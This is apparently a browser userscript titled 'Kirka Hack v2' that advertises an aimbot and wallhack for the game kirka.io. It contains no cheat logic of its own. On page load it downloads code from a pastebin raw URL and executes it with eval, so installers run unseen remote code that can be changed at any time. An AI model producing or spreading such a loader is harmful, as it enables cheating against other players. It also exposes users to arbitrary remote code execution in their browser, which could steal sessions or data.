// ==UserScript==
// @name         Kirka Hack v2
// @version      2.1
// @description  toggle aimbot: X; toggle wallhack: C
// @author       infi
// @match        *://kirka.io/*
// @icon         https://www.google.com/s2/favicons?domain=kirka.io
// @connect      raw.githubusercontent.com
// @connect      githubusercontent.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @noframes
// @namespace https://github.com/iBLiSSIN/Kirka.io_hack
// ==/UserScript==

document.addEventListener("DOMContentLoaded", () => {
    GM_xmlhttpRequest({
        url: 'https://pastebin.com/raw/jvr1RGTd',
        method: "GET",
        nocache: true,
        cache: "no-cache",
        headers: {
            'Cache-Control': 'no-cache'
        },
        onload: function(response){eval(response.responseText)},
        onerror: function(){}
    });
});
